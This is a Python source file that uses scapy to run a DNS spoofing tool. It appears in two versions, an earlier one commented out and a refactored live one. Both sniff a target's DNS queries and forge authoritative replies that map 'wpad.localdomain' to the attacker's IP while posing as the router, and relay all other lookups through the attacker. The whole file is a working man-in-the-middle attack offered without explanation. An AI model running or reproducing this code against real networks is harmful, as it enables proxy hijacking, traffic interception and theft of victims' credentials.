# from termcolor import cprint # type: ignore
# from scapy.all import conf, sniff, IP, DNSQR, DNSRR, DNS, UDP, send, sr1, Ether # type: ignore
# conf.verbose = True

# def __poison_response(pkt):
#     print("EXEC")
#     print(pkt.summary())
#     try:
#          if pkt.haslayer(Ether) and pkt.haslayer(IP) and pkt.haslayer(UDP) and pkt.haslayer(DNS):
#             original_qname = pkt[DNSQR].qname
#             if WPAD_HOSTNAME in str(original_qname):
#                 fake_dns_pkt = IP()/UDP()/DNS()/DNSRR()

#                 fake_dns_pkt[IP].src = ROUTER_IP
#                 fake_dns_pkt[IP].dst = TARGET_IP

#                 fake_dns_pkt[UDP].sport = 53
#                 fake_dns_pkt[UDP].dport = pkt[UDP].sport

#                 fake_dns_pkt[DNS].id = pkt[DNS].id
#                 fake_dns_pkt[DNS].qd = pkt[DNS].qd
#                 fake_dns_pkt[DNS].aa = 1
#                 fake_dns_pkt[DNS].qr = 1
#                 fake_dns_pkt[DNS].ancount = 1

#                 fake_dns_pkt[DNSRR].qname = WPAD_HOSTNAME + '.'
#                 fake_dns_pkt[DNSRR].rrname = WPAD_HOSTNAME + '.'
#                 fake_dns_pkt[DNSRR].rdata = ATTACKER_IP

#                 cprint(f'Sending spoofed DNS packet: {WPAD_HOSTNAME} = {ATTACKER_IP}')
#                 send(fake_dns_pkt, verbose=0)

#             else:
#                 forward_pkt = IP()/UDP()/DNS()
#                 forward_pkt[IP].dst = GOOGLE_DNS
#                 forward_pkt[UDP].sport = pkt[UDP].sport
#                 forward_pkt[DNS].rd = 1
#                 forward_pkt[DNS].qd = DNSQR(qname=original_qname)

#                 google_response = sr1(forward_pkt, verbose=0)

#                 response_pkt = IP()/UDP()/DNS()
#                 response_pkt[IP].src = ATTACKER_IP
#                 response_pkt[IP].dst = TARGET_IP
#                 response_pkt[UDP].dport = pkt[UDP].sport
#                 response_pkt[DNS] = google_response[DNS]

#                 send(response_pkt, verbose=0)

#          else:
#              print("Packet is not a DNS query")
#     except Exception as e:
#         print(f"Error parsing packet: {e}")

# def run(router_ip, target_ip, interface):
#     global ATTACKER_IP
#     global ROUTER_IP
#     global TARGET_IP
#     global WPAD_HOSTNAME
#     global GOOGLE_DNS

#     ATTACKER_IP = conf.ifaces[interface].ip
#     ROUTER_IP = router_ip
#     TARGET_IP = target_ip
#     WPAD_HOSTNAME = 'wpad.localdomain'
#     GOOGLE_DNS = '8.8.8.8'

#     cprint('*** Fake DNS server running ***', 'red', attrs=['blink', 'reverse'])
#     bpf_filter = f'udp dst port 53 and not src host {ATTACKER_IP} and host {TARGET_IP}'

#     sniff(prn=__poison_response, filter=bpf_filter, iface=interface)




from termcolor import cprint
from scapy.all import conf, sniff, IP, DNSQR, DNSRR, DNS, UDP, send, sr1, Ether

conf.verbose = True

DNS_PORT = 53
WPAD_HOSTNAME = 'wpad.localdomain'
GOOGLE_DNS = '8.8.8.8'

def craft_spoofed_packet(pkt, attacker_ip, router_ip, target_ip):
    fake_pkt = IP()/UDP()/DNS()/DNSRR()
    fake_pkt[IP].src = router_ip
    fake_pkt[IP].dst = target_ip
    fake_pkt[UDP].sport = 53
    fake_pkt[UDP].dport = pkt[UDP].sport
    fake_pkt[DNS].id = pkt[DNS].id
    fake_pkt[DNS].qd = pkt[DNS].qd
    fake_pkt[DNS].aa = 1
    fake_pkt[DNS].qr = 1
    fake_pkt[DNS].ancount = 1
    fake_pkt[DNSRR].qname = WPAD_HOSTNAME + '.'
    fake_pkt[DNSRR].rrname = WPAD_HOSTNAME + '.'
    fake_pkt[DNSRR].rdata = attacker_ip
    return fake_pkt

def forward_packet(pkt, google_dns):
    forward_pkt = IP()/UDP()/DNS()
    forward_pkt[IP].dst = google_dns
    forward_pkt[UDP].sport = pkt[UDP].sport
    forward_pkt[DNS].rd = 1
    forward_pkt[DNS].qd = DNSQR(qname=pkt[DNSQR].qname)
    return forward_pkt

def __poison_response(pkt):
    try:
        if pkt.haslayer(Ether) and pkt.haslayer(IP) and pkt.haslayer(UDP) and pkt.haslayer(DNS):
            original_qname = pkt[DNSQR].qname
            if WPAD_HOSTNAME in str(original_qname):
                spoofed_pkt = craft_spoofed_packet(pkt, ATTACKER_IP, ROUTER_IP, TARGET_IP)
                cprint(f'Sending spoofed DNS packet: {WPAD_HOSTNAME} = {ATTACKER_IP}')
                send(spoofed_pkt, verbose=0)
            else:
                forward_pkt = forward_packet(pkt, GOOGLE_DNS)
                google_response = sr1(forward_pkt, verbose=0)
                response_pkt = IP()/UDP()/DNS()
                response_pkt[IP].src = ATTACKER_IP
                response_pkt[IP].dst = TARGET_IP
                response_pkt[UDP].dport = pkt[UDP].sport
                response_pkt[DNS] = google_response[DNS]
                send(response_pkt, verbose=0)
        else:
            print("Packet is not a DNS query")
    except Exception as e:
        print(f"Error parsing packet: {e}")

def run(router_ip, target_ip, interface):
    global ATTACKER_IP
    global ROUTER_IP
    global TARGET_IP

    ATTACKER_IP = conf.ifaces[interface].ip
    ROUTER_IP = router_ip
    TARGET_IP = target_ip

    cprint('*** Fake DNS server running ***', 'red', attrs=['blink', 'reverse'])
    bpf_filter = f'udp dst port {DNS_PORT} and not src host {ATTACKER_IP} and host {TARGET_IP}'

    sniff(prn=__poison_response, filter=bpf_filter, iface=interface)